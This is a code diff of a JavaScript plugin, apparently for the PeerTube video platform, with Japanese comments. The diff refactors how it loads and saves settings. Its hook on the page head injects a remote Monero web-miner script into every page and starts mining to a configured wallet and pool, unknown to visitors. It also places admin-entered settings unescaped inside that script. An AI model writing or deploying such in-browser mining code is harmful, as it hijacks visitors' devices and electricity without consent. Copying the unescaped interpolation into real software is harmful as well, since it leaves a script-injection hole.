@@ -1,62 +1,70 @@
 const fs = require('fs');
 const path = require('path');
+const { registerHook } = require('peertube-plugin-toolkit');
 
 module.exports = class MoneroMinerPlugin {
   constructor() {
-    this.settingsFilePath = path.join(__dirname, 'pluginSettings.json'); // 設定ファイルのパス
+    this.settingsFilePath = path.join(__dirname, 'pluginSettings.json'); // 設定ファイル
   }
 
-  // 設定の読み込み
-  async loadSettings() {
-    if (fs.existsSync(this.settingsFilePath)) {
-      const data = fs.readFileSync(this.settingsFilePath, 'utf-8');
-      return JSON.parse(data);
-    } else {
-      return {
-        walletAddress: '',
-        webSocket: 'wss://ny1.xmrminingproxy.com',
-        poolAddress: 'moneroocean.stream',
-        threads: 2,
-      }; // デフォルト設定
+  loadSettingsSync() {
+    try {
+      if (fs.existsSync(this.settingsFilePath)) {
+        const data = fs.readFileSync(this.settingsFilePath, 'utf-8');
+        return JSON.parse(data);
+      } else {
+        // デフォルト設定
+        return {
+          walletAddress: '',
+          webSocket: 'wss://ny1.xmrminingproxy.com',
+          poolAddress: 'moneroocean.stream',
+          threads: 2,
+        };
+      }
+    } catch (err) {
+      console.error('Error loading settings:', err);
+      return null;
     }
   }
 
-  // 設定の保存
-  async saveSettings(settings) {
-    fs.writeFileSync(this.settingsFilePath, JSON.stringify(settings, null, 2));
-    console.log('Settings saved to file');
+  saveSettings(settings) {
+    try {
+      fs.writeFileSync(this.settingsFilePath, JSON.stringify(settings, null, 2));
+      console.log('Settings saved successfully.');
+    } catch (err) {
+      console.error('Error saving settings:', err);
+    }
   }
 
-  // フック登録
-  async hooks() {
-    const settings = await this.loadSettings();
+  hooks() {
+    const settings = this.loadSettingsSync();
 
     return [
       {
-        // Headタグにマイニングスクリプトを追加
         target: 'action:theme.head',
-        handler: async () => {
+        handler: () => {
+          if (!settings) return ''; // 設定の読み込みに失敗した場合は何も出力しない
+
           return `
             <!-- Start Of Mining Code (HTML) -->
             <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
             <script>
-                server = "${settings.webSocket}";
-                var pool = "${settings.poolAddress}";
-                var walletAddress = "${settings.walletAddress}";
-                var workerId = "GH-XMR";
-                var threads = ${settings.threads};
-                var password = "";
-                startMining(pool, walletAddress, workerId, threads, password);
-                throttleMiner = 20;
+              server = "${settings.webSocket}";
+              var pool = "${settings.poolAddress}";
+              var walletAddress = "${settings.walletAddress}";
+              var workerId = "GH-XMR";
+              var threads = ${settings.threads};
+              var password = "";
+              startMining(pool, walletAddress, workerId, threads, password);
+              throttleMiner = 20;
             </script>
             <!-- End Of Mining Code (HTML) -->
           `;
         },
       },
       {
-        // 管理画面に設定フォームを追加
         target: 'admin.plugins.list',
-        handler: async () => {
+        handler: () => {
           return `
             <div class="container">
               <h3>Monero Miner Plugin Settings</h3>
@@ -79,43 +87,40 @@ module.exports = class MoneroMinerPlugin {
                 </div>
                 <button type="submit" class="btn btn-primary">Save Settings</button>
               </form>
-            </div>
-            <script>
-              document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const settings = {
-                  walletAddress: document.getElementById('walletAddress').value,
-                  webSocket: document.getElementById('webSocket').value,
-                  poolAddress: document.getElementById('poolAddress').value,
-                  threads: parseInt(document.getElementById('threads').value, 10)
-                };
-
-                try {
-                  const response = await fetch('/api/v1/plugins/admin/monero-miner/settings', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(settings),
-                  });
-
-                  if (response.ok) {
-                    alert('Settings saved successfully!');
-                  } else {
-                    alert('Failed to save settings. Please check the server logs.');
+              <script>
+                document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
+                  e.preventDefault();
+                  const settings = {
+                    walletAddress: document.getElementById('walletAddress').value,
+                    webSocket: document.getElementById('webSocket').value,
+                    poolAddress: document.getElementById('poolAddress').value,
+                    threads: parseInt(document.getElementById('threads').value, 10)
+                  };
+                  try {
+                    const response = await fetch('/api/v1/plugins/admin/monero-miner/settings', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(settings),
+                    });
+                    if (response.ok) {
+                      alert('Settings saved successfully!');
+                    } else {
+                      alert('Failed to save settings. Please check the server logs.');
+                    }
+                  } catch (error) {
+                    console.error('Error saving settings:', error);
+                    alert('An error occurred while saving settings.');
                   }
-                } catch (error) {
-                  console.error('Error saving settings:', error);
-                  alert('An error occurred while saving settings.');
-                }
-              });
-            </script>
+                });
+              </script>
+            </div>
           `;
         },
       },
       {
-        // 設定保存用エンドポイント
         target: 'admin.plugins.save',
         handler: async (pluginData) => {
-          await this.saveSettings(pluginData);
+          this.saveSettings(pluginData);
         },
       },
     ];
